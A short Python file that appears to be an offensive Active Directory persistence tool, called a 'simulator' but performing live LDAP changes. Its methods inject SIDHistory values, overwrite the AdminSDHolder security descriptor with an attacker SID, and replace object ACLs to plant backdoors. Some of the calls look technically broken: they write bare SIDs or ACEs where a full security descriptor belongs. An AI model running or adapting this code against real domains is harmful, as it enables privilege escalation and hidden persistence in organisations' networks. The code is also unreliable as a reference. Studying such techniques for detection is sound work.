import ldap3
import logging

class ADBackdoorSimulator:
    def __init__(self, ldap_server, username, password, domain, verbose=False):
        self.ldap_server = ldap_server
        self.username = username
        self.password = password
        self.domain = domain
        self.verbose = verbose
        self.conn = None

    def connect(self):
        server = ldap3.Server(self.ldap_server, get_info=ldap3.ALL)
        self.conn = ldap3.Connection(server, user=f"{self.domain}\\{self.username}", password=self.password, auto_bind=True)
        if self.verbose:
            print("[+] Connected to LDAP server")

    def sid_history_injection(self, target_dn, sid_to_inject):
        self.connect()
        self.conn.modify(target_dn, {'sIDHistory': [(ldap3.MODIFY_ADD, [sid_to_inject])]})
        if self.conn.result['result'] == 0:
            print(f"[+] SIDHistory injection successful for {target_dn}")
        else:
            print(f"[-] SIDHistory injection failed: {self.conn.result}")

    def adminsdholder_abuse(self, attacker_sid):
        self.connect()
        adminsdholder_dn = f"CN=AdminSDHolder,CN=System,{self._get_base_dn()}"
        self.conn.modify(adminsdholder_dn, {'ntSecurityDescriptor': [(ldap3.MODIFY_REPLACE, [attacker_sid])]})
        if self.conn.result['result'] == 0:
            print(f"[+] AdminSDHolder overwritten with attacker SID")
        else:
            print(f"[-] AdminSDHolder modification failed: {self.conn.result}")

    def acl_backdoor(self, target_dn, ace):
        self.connect()
        self.conn.modify(target_dn, {'ntSecurityDescriptor': [(ldap3.MODIFY_REPLACE, [ace])]})
        if self.conn.result['result'] == 0:
            print(f"[+] ACL-based backdoor added to {target_dn}")
        else:
            print(f"[-] ACL backdoor failed: {self.conn.result}")

    def _get_base_dn(self):
        parts = self.domain.split('.')
        return ','.join([f"DC={p}" for p in parts])
